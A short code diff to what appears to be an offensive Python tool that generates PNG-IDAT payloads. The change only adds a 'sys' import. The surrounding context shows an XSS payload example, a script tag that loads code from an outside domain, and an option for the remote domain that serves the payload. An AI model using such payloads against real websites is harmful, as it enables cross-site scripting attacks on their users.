@@ -11,8 +11,7 @@ Payloads:
 	XSS:	Varies alot. Easier with short remote include -- aka <SCRIPT src=//LOG.BZ><script>
 '''
 from coreFunctions import *
-import argparse
-
+import argparse,sys
 #args
 parser = argparse.ArgumentParser(description="Tool to generate PNG-IDAT Payloads.")
 parser.add_argument('-r', '--remote-domain', dest='remoteDomain', help='Remote domain to retrieve payload from (shorter the better: ex. xx.xxx)', required=True, type=str)
